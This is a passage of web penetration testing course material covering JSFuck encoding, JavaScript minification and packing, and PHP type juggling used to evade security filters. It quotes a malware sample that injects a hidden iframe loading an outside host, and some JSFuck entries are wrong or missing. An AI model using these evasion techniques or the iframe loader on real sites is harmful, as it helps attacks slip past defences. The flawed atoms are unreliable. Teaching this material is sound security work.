### 2.3.1.7 JSFuck

**Source:**
- [sla.ckers.org Forum Discussion](http://web.archive.org/web/20110707162819/http://sla.ckers.org/forum/read.php?24,32930)

**Introduction:**
One of the most intriguing encoding techniques discussed on the sla.ckers.org forum is JSFuck. This method allows for writing and executing JavaScript code using only six distinct characters: `()[]!+`. The goal is to start from the fundamental elements of JavaScript and build the encoded payload.

**Basic Atomic Parts:**
Below are some of the basic atomic parts used in JSFuck. A comprehensive list can be found on GitHub.

- **'SIMPLE' String:**
  ```javascript
  ![]
  ```

- **False:**
  ```javascript
  ![]
  ```

- **True:**
  ```javascript
  !![]
  ```

- **Undefined:**
  ```javascript
  [] + []
  ```

- **NaN:**
  ```javascript
  +[![]]
  ```

- **Infinity:**
  ```javascript
  +(+(+!+[] + (!+[] + [])[+!+[] + +!+[] + +!+[]]) + [+!+[]] + [+[]] + [+[]] + [+[]])
  ```

- **Array:**
  ```javascript
  []
  ```

- **Number:**
  ```javascript
  +[]
  ```

- **String:**
  ```javascript
  [] + []
  ```

- **Boolean:**
  ```javascript
  ![]
  ```

- **Function:**
  ```javascript
  []["filter"]
  ```

- **Eval:**
  ```javascript
  []["filter"]["constructor"](CODE)()
  ```

- **Window:**
  ```javascript
  []["filter"]["constructor"]("return this")()
  ```

**Example:**
Here is an example of a more complex JSFuck-encoded string:
```javascript

```

### 2.3.2 JavaScript Minification

**Introduction:**
To enhance the performance of JavaScript, developers often use tools that compile JavaScript into more compact and efficient code. These tools can also be used to obfuscate code, making it harder to detect and understand. This chapter will focus on these techniques.

#### 2.3.2.1 Minifying

**Definition:**
Minification is the process of removing all unnecessary characters from JavaScript code without altering its functionality. This includes removing whitespaces, new lines, and comments, which are ignored by the interpreter.

**Example:**

- **Original Code:**
  ```javascript
  /* Make a Frame */
  function MakeFrameEx() {
      element = document.getElementById('yahoo_api');
      if (!element) {
          var el = document.createElement('iframe');
          document.body.appendChild(el);
          el.id = 'yahoo_api';
          el.style.width = '1px';
          el.style.height = '1px';
          el.style.display = 'none';
          el.src = 'http://10.10.10.21/do?'; // source obfuscated
      }
  }
  var ua = navigator.userAgent.toLowerCase();
  if (((ua.indexOf("msie") != -1 && ua.indexOf("opera") == -1 && ua.indexOf("webtv") == -1)) && ua.indexOf("windows") != -1) {
      var t = setTimeout("MakeFrameEx()", 1000);
  }
  ```
  - **Source:** [JavaScript Malware Example](http://aw-snap.info/articles/js-examples.php)

- **Minified Code:**
  ```javascript
  function MakeFrameEx(){element=document.getElementById('yahoo_api');if(!element){var el=document.createElement('iframe');document.body.appendChild(el);el.id='yahoo_api';el.style.width='1px';el.style.height='1px';el.style.display='none';el.src='http://10.10.10.21/do?'}}var ua=navigator.userAgent.toLowerCase();if(((ua.indexOf("msie")!=-1&&ua.indexOf("opera")==-1&&ua.indexOf("webtv")==-1))&&ua.indexOf("windows")!=-1){var t=setTimeout("MakeFrameEx()",1000)}
  ```

**Tools:**
- **Closure Compiler by Google:**
  - [Google Closure Compiler](https://developers.google.com/closure/compiler/)
- **YUICompressor by Yahoo:**
  - [YUICompressor](http://yui.github.io/yuicompressor/)
- **JSMin by Douglas Crockford:**
  - [JSMin](http://crockford.com/javascript/jsmin)
- **Packer by Dean Edwards:**
  - [Dean Edwards Packer](http://dean.edwards.name/packer/)

#### 2.3.2.2 Packing

**Definition:**
Packing is a more advanced form of minification that further compresses the code by shortening variable names, functions, and other operations, making the code even more unreadable.

**Example:**
- **Packed Code:**
  - Screenshot of the previous JavaScript malware packed with Dean Edwards's tool.

**Packing Options:**
- Various options are available for packing, such as different levels of compression and obfuscation.

### 2.4 PHP Obfuscation Techniques

**Introduction:**
PHP obfuscation techniques are used for two main reasons: protecting intellectual property and evading security systems. This chapter will focus on the latter, exploring how to use PHP features to obfuscate code effectively.

#### 2.4.1 Basic Language Reference

**Type Juggling:**
- PHP is a dynamically typed language, allowing for type juggling. This means that variables can change types based on the context in which they are used.

**Example:**
```php
$joke = "1";
$joke++;
$joke += 19.8;
$joke = 8 + "7 -Ignore me please-";
$joke = "a string" + array("1.1 another string")[0];
$joke = 3 + 2 * (TRUE + TRUE);
$joke .= '';
$joke += '';

// Output:
// string(1) "1"
// int(2)
// float(21.8)
// int(15)
// float(1.1)
// int(7)
// string(1) "7"
// int(7)
```

#### 2.4.1.2 Numerical Data Types

**Accessing Strings and Numbers:**
- In PHP, you can access elements inside strings or arrays using various numerical data types, including decimal, octal, hexadecimal, and binary.

**Example:**
```php
$x = 'Giuseppe';
echo $x[0];              // decimal index (0)        > 'G'
echo $x[0001];           // octal index (1)          > 'i'
echo $x[0x02];           // hexadecimal index (2)    > 'u'
echo $x[0b11];           // binary index (3)         > 's'

// Floating numbers:
echo $x[0.1];                // floating (0.1) casted to 0 > 'G'
echo $x[.1e+1];              // exponential                > 'i'
echo $x[0.2E+0000000000001]; // long exponential           > 'u'
echo $x[1e+1-1E-1-5.999];    // exponential and floating
```

**Note:**
- Binary integer literals are available since PHP 5.4.0.

**Structure for Integer Literals:**
- **Decimal:** `[1-9][0-9]*` or `0`
- **Hexadecimal:** `0[xX][0-9a-fA-F]+`
- **Octal:** `0[0-7]+`
- **Binary:** `0b[01]+`

**Valid Example:**
```php
$x = 'Giuseppe';
echo $x[0];              // decimal index (0)      > 'G'
echo $x[00000000000001]; // octal index (1)        > 'i'
echo $x[0x000000000002]; // hexadecimal index (2)  > 'u'
echo $x[0b000000000011]; // binary index (3)       > 's'
```

---

**WAPTXv2: Section 01, Module 02 - Caendra Inc. Â© 2020**